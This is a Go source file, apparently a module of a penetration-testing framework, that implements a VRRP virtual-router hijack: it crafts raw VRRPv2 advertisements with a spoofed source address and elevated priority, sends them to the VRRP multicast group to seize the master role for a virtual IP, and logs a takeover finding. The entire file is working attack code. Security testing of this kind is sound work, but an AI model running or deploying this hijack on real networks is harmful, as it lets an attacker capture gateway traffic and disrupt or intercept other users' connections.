// vrrp.go implements the VRRP virtual-router hijack attack behavior.
//
// Durability (from the catalog): transient-decay. The attack sends VRRP
// advertisements with a high priority to claim the virtual router master
// role. The real master resumes via NUD when the attack stops — no
// explicit teardown is needed.
//
// VRRPv2 rides directly on IP (protocol 112), not UDP. gopacket's VRRPv2
// decoder has no SerializeTo, so the body is built as raw bytes matching
// the baseline's vrrp_frame (KTD3: fork's VRRPv2 decoder; KTD14: field-set
// verification, not byte-for-byte on the checksum).

package fh

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type vrrpFinding struct {
	Action   string   `json:"action"`
	VRID     uint8    `json:"vrid"`
	Priority uint8    `json:"priority"`
	VIPs     []string `json:"vips"`
}

// RunVRRP sends VRRP advertisements to claim the virtual router.
func RunVRRP(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	vrid := uint8(51)
	priority := uint8(120)
	vips := []net.IP{net.IPv4(10, 0, 0, 1)}

	pkt, err := craftVRRP(src, vrid, priority, vips)
	if err != nil {
		return fmt.Errorf("vrrp: craft advertisement: %w", err)
	}

	count := 2
	for range count {
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("vrrp: send advertisement: %w", err)
		}
	}

	vipStrs := make([]string, len(vips))
	for i, v := range vips {
		vipStrs[i] = v.String()
	}
	detail, _ := json.Marshal(vrrpFinding{
		Action:   "vrrp-takeover",
		VRID:     vrid,
		Priority: priority,
		VIPs:     vipStrs,
	})
	deps.Emitter.Finding("vrrp", detail)

	return nil
}

// craftVRRP builds a VRRPv2 advertisement: Ethernet → IPv4(224.0.0.18,
// ttl=255, proto=112) → VRRP body. The body is built manually since
// gopacket's VRRPv2 has no SerializeTo.
func craftVRRP(src net.HardwareAddr, vrid, priority uint8, vips []net.IP) ([]byte, error) {
	// Header: Version|Type(1) | VRID(1) | Priority(1) | CountIP(1)
	//         | AuthType(1) | AdverInt(1) | Checksum(2) | IP(s)
	body := make([]byte, 8+4*len(vips))
	body[0] = 0x21 // version=2, type=1 (advertisement)
	body[1] = vrid
	body[2] = priority
	body[3] = byte(len(vips))
	body[4] = 0 // auth type
	body[5] = 1 // adver interval
	// checksum at [6:8] — left 0; field-set verified (KTD14).
	for i, vip := range vips {
		copy(body[8+4*i:], vip.To4())
	}

	eth := &layers.Ethernet{
		DstMAC:       vrrpDstMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      255,
		Protocol: 112, // VRRP
		SrcIP:    net.IPv4(10, 0, 0, 2),
		DstIP:    net.IPv4(224, 0, 0, 18),
		Length:   20 + uint16(len(body)),
	}
	return craftL3Payload(eth, ip, body)
}
